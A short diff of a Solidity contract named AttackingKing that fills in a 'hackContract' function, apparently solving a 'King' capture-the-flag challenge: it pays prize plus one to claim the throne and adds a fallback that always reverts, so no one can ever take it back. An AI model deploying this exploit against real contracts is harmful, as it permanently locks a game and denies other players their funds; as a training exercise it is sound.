@@ -11,6 +11,13 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        uint256 prize = King(payable(contractAddress)).prize();
+        (bool success,) = payable(contractAddress).call{value: prize + 1, gas: 50000}("");
+        require(success, "CALL_FAILED");
+    }
+
+    // Fails on transfer
+    fallback() external payable {
+        revert("hehe u no transfer");
     }
 }
